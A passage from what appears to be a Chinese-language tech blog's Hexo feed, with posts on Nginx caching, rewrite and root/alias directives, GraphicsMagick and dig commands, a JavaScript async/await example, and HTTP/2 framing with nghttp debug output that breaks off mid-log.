        <content type="html"><![CDATA[<h2 id="Nginx-缓存"><a href="#Nginx-缓存" class="headerlink" title="Nginx 缓存"></a>Nginx 缓存</h2><blockquote><p>默认情况下，NGINX需要考虑从原始服务器得到的Cache-Control标头。当在响应头部中Cache-Control被配置为Private，No-Cache，No-Store或者Set-Cookie，NGINX不进行缓存。NGINX仅仅缓存GET和HEAD客户端请求。</p></blockquote><h3 id="proxy-cache-path"><a href="#proxy-cache-path" class="headerlink" title="proxy_cache_path"></a>proxy_cache_path</h3><blockquote><p>proxy_cache_path用来设置缓存的路径和配置</p></blockquote><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy_cache_path /usr/local/openresty/nginx/proxy_cache/ levels=1:2 keys_zone=my_cache:5m max_size=1g inactive=7d;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>/usr/local/openresty/nginx/proxy_cache/</code></td><td>表示缓存文件目录。</td></tr><tr><td><code>levels=1:2</code></td><td>将大量的文件放置在单个目录中会导致文件访问缓慢。这里指定缓存空间有两层hash目录，第一层目录为1个字母，第二层为2个字母，保存的文件名会类似 <code>/usr/local/openresty/nginx/proxy_cache/</code><strong>c</strong><code>/</code><strong>29</strong><code>/01524fae79697630d0454ba3fabd9</code><strong>29c</strong>。</td></tr><tr><td><code>keys_zone=my_cache:5m</code></td><td>设置一个共享内存区，该内存区用于存储缓存键和元数据，有些类似计时器的用途。将键的拷贝放入内存可以使NGINX在不检索磁盘的情况下快速决定一个请求是<code>HIT</code>还是<code>MISS</code>，这样大大提高了检索速度。一个1MB的内存空间可以存储大约8000个key。</td></tr><tr><td><code>max_size=1g</code></td><td>设置了缓存的上限。</td></tr><tr><td><code>inactive=7d</code></td><td>inactive 指定了项目在不被访问的情况下能够在内存中保持的时间。在上面的例子中，如果一个文件在7天之内没有被请求，则缓存管理将会自动将其在内存中删除，不管该文件是否过期。该参数默认值为10分钟（10m）。注意，非活动内容有别于过期内容。NGINX不会自动删除由缓存控制头部指定的过期内容（本例中Cache-Control:max-age&#x3D;120）。过期内容只有在<code>inactive</code>指定时间内没有被访问的情况下才会被删除。如果过期内容被访问了，那么NGINX就会将其从原服务器上刷新，并更新对应的<code>inactive</code>计时器。</td></tr></tbody></table><h3 id="proxy-cache"><a href="#proxy-cache" class="headerlink" title="proxy_cache"></a>proxy_cache</h3><blockquote><p>配置在location中，用来启用缓存<br><code>proxy_cache</code>的值是上面proxy_cache_path配置中<code>keys_zone</code>缓存的名字。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache my_cache;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-methods"><a href="#proxy-cache-methods" class="headerlink" title="proxy_cache_methods"></a>proxy_cache_methods</h3><p>该指令用于设置缓存哪些HTTP方法，默认缓存HTTP GET&#x2F;HEAD方法，不缓存HTTP POST方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_methods GET HEAD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-min-uses"><a href="#proxy-cache-min-uses" class="headerlink" title="proxy_cache_min_uses"></a>proxy_cache_min_uses</h3><p>是指同一个url，不管时间间隔多长，是否在一个缓存周期外，只要总次数到达<code>proxy_cache_min_uses</code>次数，就会触发缓存功能。后续缓存失效以后，只要访问一次，又会缓存。<code>proxy_cache_min_uses</code>默认值是<code>1</code>，当缓存不断被填满时，这项设置便十分有用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_min_uses 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-use-stale"><a href="#proxy-cache-use-stale" class="headerlink" title="proxy_cache_use_stale"></a>proxy_cache_use_stale</h3><p>当无法从原始服务器获取最新的内容时，NGINX可以分发缓存中的陈旧内容。这种情况一般发生在关联缓存内容的原始服务器宕机或者繁忙时。比起对客户端传达错误信息，NGINX可发送在其内存中的陈旧的文件。NGINX的这种代理方式，为服务器提供额外级别的容错能力，并确保了在服务器故障或流量峰值的情况下的正常运行。</p><p><code>proxy_cache_use_stale</code>还有个取值<code>updating</code>，它的意思在缓存过期时当第一个请求正在获取新资源的时候如果有其它请求过来，那么现在先给它们旧的资源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_use_stale error timeout http_500 http_502 http_503 http_504;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-lock"><a href="#proxy-cache-lock" class="headerlink" title="proxy_cache_lock"></a>proxy_cache_lock</h3><p>当<code>proxy_cache_lock</code>被启用时，当多个客户端请求一个缓存中不存在的文件（或称之为一个<code>MISS</code>），只有这些请求中的第一个被允许发送至服务器。其他请求在第一个请求得到满意结果之后在缓存中得到文件。如果不启用<code>proxy_cache_lock</code>，则所有在缓存中找不到文件的请求都会直接与服务器通信。</p><p>这和<code>proxy_cache_use_stale</code>取<code>updating</code>不太一样，<code>proxy_cache_use_stale</code>取<code>updating</code>时后续的请求不会等待，而是直接先使用过期的资源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_lock on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-revalidate"><a href="#proxy-cache-revalidate" class="headerlink" title="proxy_cache_revalidate"></a>proxy_cache_revalidate</h3><p>缓存再验证，使用HTTP的304机制。文件过期不代表文件真的有变化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_revalidate on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-cache-valid"><a href="#proxy-cache-valid" class="headerlink" title="proxy_cache_valid"></a>proxy_cache_valid</h3><p>该指令用于对不同返回状态码的URL设置不同的缓存时间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_valid 200 302 10m;</span><br><span class="line">    proxy_cache_valid 301 1h;</span><br><span class="line">    proxy_cache_valid any 1m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="proxy-ignore-headers"><a href="#proxy-ignore-headers" class="headerlink" title="proxy_ignore_headers"></a>proxy_ignore_headers</h3><p>对于源站而言，Nginx也就是一个大的浏览器，源站告诉Nginx的Expires&#x2F;Cache-Control指定了max-age值，按照规则是轮不到proxy_cache_valid的。那么如果一定要根据Nginx缓存时间为准怎么办呢？那就是忽略源站的Expires&#x2F;Cache-Control控制。</p><p>location &#x2F; {<br>    …<br>    proxy_ignore_headers Cache-Control;<br>    proxy_ignore_headers Expires;<br>}</p><h3 id="ngx-cache-purge"><a href="#ngx-cache-purge" class="headerlink" title="ngx_cache_purge"></a>ngx_cache_purge</h3><p>如果要想更灵活点，我们可能还需要清理缓存功能。默认Nginx缓存模块没提供这个功能，我们需要使用一个第三方的模块来实现<a href="https://github.com/FRiCKLE/ngx_cache_purge">ngx_cache_purge</a></p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache_path /usr/local/openresty/nginx/proxy_cache/ levels=1:2 keys_zone=my_cache:5m max_size=1g inactive=7d;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    ...</span><br><span class="line">    proxy_cache my_cache;</span><br><span class="line">    proxy_cache_revalidate on;</span><br><span class="line">    proxy_cache_use_stale error timeout http_500 http_502 http_503 http_504;</span><br><span class="line">    proxy_cache_lock on;</span><br><span class="line">    proxy_cache_valid any 1d; # 在源站没有设置缓存时间时生效</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.jfh.com/jfperiodical/article/949">NGINX缓存使用官方指南</a></li><li>实战Nginx：取代Apache的高性能Web服务器（第九章）</li><li><a href="http://www.firefoxbug.com/index.php/archives/2089/">Nginx缓存详细配置</a></li><li><a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_ignore_headers">http://nginx.org/en/docs/http/ngx_http_proxy_module.html?#proxy_ignore_headers</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cache </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一致性Hash</title>
      <link href="/post/consistent-hashing.html"/>
      <url>/post/consistent-hashing.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/QQ20171023-161427@2x.jpg"><br><img src="/images/QQ20171023-161458@2x.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gm</title>
      <link href="/post/gm.html"/>
      <url>/post/gm.html</url>
      
        <content type="html"><![CDATA[<p>gm convert myImage.png +dither -depth 8 -colors 50 myImage.png</p><p>gm identify -format “file_size:%b,unique_colors:%k,bit_depth:%q” myImage.png</p><p>gm convert -strip -interlace Plane -gaussian-blur 0.05 -quality 85% source.jpg result.jpg</p><p><a href="https://stackoverflow.com/questions/4228027/what-options-for-convert-imagemagick-or-graphicsmagick-produce-the-smallest-f">https://stackoverflow.com/questions/4228027/what-options-for-convert-imagemagick-or-graphicsmagick-produce-the-smallest-f</a></p><p><a href="http://www.iitshare.com/the-graphicsmagick-installation-and-use.html">http://www.iitshare.com/the-graphicsmagick-installation-and-use.html</a></p><p><a href="https://my.oschina.net/pangzhuzhu/blog/317925">https://my.oschina.net/pangzhuzhu/blog/317925</a></p><p><a href="http://www.cnblogs.com/zhoujingjie/p/4917461.html">http://www.cnblogs.com/zhoujingjie/p/4917461.html</a></p><p><a href="https://stackoverflow.com/questions/25372402/graphicsmagick-processes-resulting-in-empty-file">https://stackoverflow.com/questions/25372402/graphicsmagick-processes-resulting-in-empty-file</a></p><p><a href="https://stackoverflow.com/questions/6605006/convert-pdf-to-image-with-high-resolution">https://stackoverflow.com/questions/6605006/convert-pdf-to-image-with-high-resolution</a></p><p><a href="https://stackoverflow.com/questions/2257322/reducing-the-file-size-of-a-very-large-images-without-changing-the-image-dimens">https://stackoverflow.com/questions/2257322/reducing-the-file-size-of-a-very-large-images-without-changing-the-image-dimens</a>cd GraphicsMagic</p>]]></content>
      
      
      
        <tags>
            
            <tag> gm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx-rewrite</title>
      <link href="/post/nginx-rewrite.html"/>
      <url>/post/nginx-rewrite.html</url>
      
        <content type="html"><![CDATA[<h3 id="rewrite指令"><a href="#rewrite指令" class="headerlink" title="rewrite指令"></a>rewrite指令</h3><p>使用rewrite指令我们可以改写URL，实现外部和内部重定向。</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>语法</td><td>rewrite regex replacement flag</td></tr><tr><td>默认值</td><td>none</td></tr><tr><td>使用环境</td><td>server, location, if</td></tr></tbody></table><h4 id="regex"><a href="#regex" class="headerlink" title="regex"></a>regex</h4><p>正则匹配规则，Nginx正则采用PCRE正则表达式语法，和Java、JavaScript等语言一样。</p><h4 id="replacement"><a href="#replacement" class="headerlink" title="replacement"></a>replacement</h4><p>这个部分可以使用字符串、Nginx变量、以及正则匹配到的元组（从<code>$1</code>到<code>$9</code>）</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag 一共四种，用来说明匹配到后内部如何处理。</p><table><thead><tr><th>flag</th><th>解释</th></tr></thead><tbody><tr><td>permanent</td><td>301 永久重定向</td></tr><tr><td>redirect</td><td>302 临时重定向</td></tr><tr><td>last</td><td>内部重定向，会在内部重新发起请求。</td></tr><tr><td>break</td><td>不会像last一样重新发起请求，终止匹配。直接使用新URL在当前location中请求。</td></tr></tbody></table><h4 id="last-与-break"><a href="#last-与-break" class="headerlink" title="last 与 break"></a>last 与 break</h4><p>last标记在本条rewrite规则执行完毕后，会对其所在的<code>server{...}</code>标签重新发起请求，而<code>break</code>标记则在本条规则匹配完成后，终止匹配，不再匹配后面的规则。<br>使用<code>alias</code>指令时必须用<code>last</code>标记，使用<code>proxy_pass</code>指令时要使用<code>break</code>标记。</p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>viewport</title>
      <link href="/post/viewport.html"/>
      <url>/post/viewport.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/2050/p/3877280.html">移动前端开发之viewport的深入理解</a></p><p>关键词：layout viewport、visual viewport、ideal viewport</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx-root-alias</title>
      <link href="/post/nginx-root-alias.html"/>
      <url>/post/nginx-root-alias.html</url>
      
        <content type="html"><![CDATA[<h3 id="nginx-root-alias"><a href="#nginx-root-alias" class="headerlink" title="nginx root &amp; alias"></a>nginx root &amp; alias</h3><p><code>root</code>是指定一个项目根目录，<code>alias</code>表示一个拼接的意思。</p><p>例如我们请求路径为<code>https://www.domain.com/images/logo.png</code></p><p><strong>root</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    root /var/www;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际映射路径是 <code>/var/www/images/logo.png</code></p><p><strong>alias</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ^~ /images/ &#123;</span><br><span class="line">    alias /var/www/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际映射路径是 <code>/var/www/logo.png</code></p><blockquote><p>注意：<code>alias</code>的后面如果指定的是一个文件夹斜杠不能省略。<code>alias</code>的最终处理是拼接的过程。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dig</title>
      <link href="/post/dig.html"/>
      <url>/post/dig.html</url>
      
        <content type="html"><![CDATA[<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><p>dig命令是常用的域名查询工具，可以用来测试域名系统工作是否正常。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install bind-utils</span><br></pre></td></tr></table></figure><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>dig @DNS_SERVER DOMAIN_NAME [ANY|ANY|A|MX|SIG]</p><ul><li><p>查询域名的A地址</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @8.8.8.8 www.baidu.com A</span><br></pre></td></tr></table></figure></li><li><p>查询域名的CNAME </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @8.8.8.8 www.baidu.com CNAME</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://blog.csdn.net/reyleon/article/details/12976889">使用dig命令解析域名</a></li><li><a href="http://www.cnblogs.com/daxian2012/archive/2013/01/10/2854126.html">dig命令使用大全</a></li><li><a href="http://man.linuxde.net/dig">dig命令</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> dns </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async/await</title>
      <link href="/post/async-await.html"/>
      <url>/post/async-await.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// async function like a auto-execute generator function. Juse like co.</span></span><br><span class="line"><span class="comment">// co + generator yield similar with async/await</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params">ret</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> (<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ret) <span class="title function_">resolve</span>(ret)</span><br><span class="line">            <span class="keyword">else</span> <span class="title function_">reject</span>(<span class="string">&#x27;err&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// async function return a promise;</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// you can use Promise.all to parallel execute function.</span></span><br><span class="line">    <span class="keyword">let</span> rets = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="title function_">f1</span>(<span class="string">&#x27;f1_1&#x27;</span>), <span class="title function_">f1</span>(<span class="string">&#x27;f1_2&#x27;</span>)]);</span><br><span class="line">    <span class="comment">// throw new Error(&#x27;abc&#x27;);</span></span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// you can use catch function to catch async function error.</span></span><br><span class="line"><span class="comment">// also you can use try-catch to catch error in async function inner. </span></span><br><span class="line"><span class="title function_">f2</span>()</span><br><span class="line">    .<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------</span></span><br><span class="line"><span class="comment">// similar code </span></span><br><span class="line"><span class="title function_">co</span>(<span class="keyword">function</span>* () &#123;</span><br><span class="line">    <span class="keyword">let</span> rets = <span class="keyword">yield</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([<span class="title function_">f1</span>(<span class="string">&#x27;f1_1&#x27;</span>), <span class="title function_">f1</span>(<span class="string">&#x27;f1_2&#x27;</span>)]);</span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> async </tag>
            
            <tag> await </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc</title>
      <link href="/post/nc.html"/>
      <url>/post/nc.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>forever</title>
      <link href="/post/forever.html"/>
      <url>/post/forever.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> forever </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP2</title>
      <link href="/post/http2.html"/>
      <url>/post/http2.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP2"><a href="#HTTP2" class="headerlink" title="HTTP2"></a>HTTP2</h2><p>重要概念：</p><ul><li><p>流</p><p>  流是连接中的一个虚拟信道，可以承载双向的消息。可以认为一个流代表着一个请求-响应的数据。</p></li><li><p>消息</p><p>  与逻辑消息对应的完整的一系列数据帧。</p></li><li><p>帧</p><p>  HTTP 2.0 通信的最小单位，每个帧包含帧首部，至少也会标识出当前帧所属的流。</p></li></ul><h3 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h3><p>响应头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Link: &lt;/css/styles.css&gt;; rel=preload; as=style, &lt;/js/main.js;&gt;; rel=preload; as=script</span><br></pre></td></tr></table></figure><p>nginx &gt; 1.13.9 &amp; <strong><a href="https://www.openssl.org/source/">最新版openssl</a></strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginx自己处理</span></span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">http2_push</span> /css/style.css;</span><br><span class="line">    <span class="attribute">http2_push</span> /js/main.js;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 后端实现</span></span><br><span class="line"><span class="section">location</span><span class="regexp"> ^~</span> /backend &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://upstream;</span><br><span class="line">    <span class="attribute">http2_push_preload</span> <span class="literal">on</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/http2-server-push.png"></p><blockquote><p>macOS&#x2F;10.13.4 Chrome&#x2F;66.0.3359.181 nginx&#x2F;1.13.12 中测试发现最多支持10个Server Push。</p></blockquote><h3 id="协议帧"><a href="#协议帧" class="headerlink" title="协议帧"></a>协议帧</h3><p>帧的类型有HEADERS帧、DATA帧、SETTINGS帧、PRIORITY帧等等。</p><p><img src="/images/http2-binary-framing.png"></p><p>帧的头部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------+</span><br><span class="line">|                 Length (24)                   |</span><br><span class="line">+---------------+---------------+---------------+</span><br><span class="line">|   Type (8)    |   Flags (8)   |</span><br><span class="line">+-+-------------+---------------+-------------------------------+</span><br><span class="line">|R|                 Stream Identifier (31)                      |</span><br><span class="line">+=+=============================================================+</span><br><span class="line">|                   Frame Payload (0...)                      ...</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure><ul><li><p>Length： 24 bits</p><p>  帧的载荷（不包括头部的9 bytes）。除非<code>SETTINGS_MAX_FRAME_SIZE</code>设置有更大值，否则不能大于2^14（16,384）16kb。</p></li><li><p>Type： 8 bits</p><p>  帧类型，未知类型会被丢弃。</p></li><li><p>Flags：8 bits</p><p>  具体帧的标识，默认值0x00。（查看后面例子中的SETTINGS帧的flags）</p></li><li><p>R：1 bits</p><p>  预留。</p></li><li><p>Stream Identifier：31 bits</p><p>  流ID。</p></li></ul><p>使用<a href="https://nghttp2.org/">nghttp</a>调试：</p><blockquote><p>本例中我们服务器端会使用ServerPUSH推送<code>/css/index.css</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nghttp -nvu  https://h2.kekek.cc/</span></span><br><span class="line">[  0.012] Connected</span><br><span class="line">The negotiated protocol: h2                                                 -- 协议升级到h2</span><br><span class="line">[  0.019] recv SETTINGS frame &lt;length=18, flags=0x00, stream_id=0&gt;          -- 设置帧 此处为服务器端的设置参数，给客户端时使用。</span><br><span class="line">          (niv=3)                                                           -- 设置帧被应用于整个连接，而不是一个单独的流。SETTINGS帧的流标识必须是0。</span><br><span class="line">          [SETTINGS_MAX_CONCURRENT_STREAMS(0x03):128]                       -- 允许打开流的最大值。</span><br><span class="line">          [SETTINGS_INITIAL_WINDOW_SIZE(0x04):65536]                        -- 流量控制的初始窗口大小。默认2^16-1 (65,535)字节</span><br><span class="line">          [SETTINGS_MAX_FRAME_SIZE(0x05):16777215]                          -- 单帧最大值。</span><br><span class="line">                                                                            -- 默认为2^14（16384）个字节，值区间为2^14（16384）-2^24-1(16777215)。 </span><br><span class="line">[  0.019] recv WINDOW_UPDATE frame &lt;length=4, flags=0x00, stream_id=0&gt;      -- 流量控制帧，作用于单个流以及整个连接，但只能影响两个端点之间传输的DATA数据帧。</span><br><span class="line">          (window_size_increment=2147418112)                                -- 流标识符为0，影响整个连接，非单个流。</span><br><span class="line">[  0.019] send SETTINGS frame &lt;length=12, flags=0x00, stream_id=0&gt;          -- 设置帧 此处为客户端的设置参数，给服务器使用。</span><br><span class="line">          (niv=2)</span><br><span class="line">          [SETTINGS_MAX_CONCURRENT_STREAMS(0x03):100]</span><br><span class="line">          [SETTINGS_INITIAL_WINDOW_SIZE(0x04):65535]</span><br><span class="line">[  0.019] send SETTINGS frame &lt;length=0, flags=0x01, stream_id=0&gt;           -- ACK (0x1)：设置这个标志位表明当前帧确认接收和应用了对端的SETTINGS帧。</span><br><span class="line">          ; ACK</span><br><span class="line">          (niv=0)</span><br><span class="line">[  0.019] send PRIORITY frame &lt;length=5, flags=0x00, stream_id=3&gt;            -- 优先级帧 stream_id为0x00时返回PROTOCOL_ERROR。</span><br><span 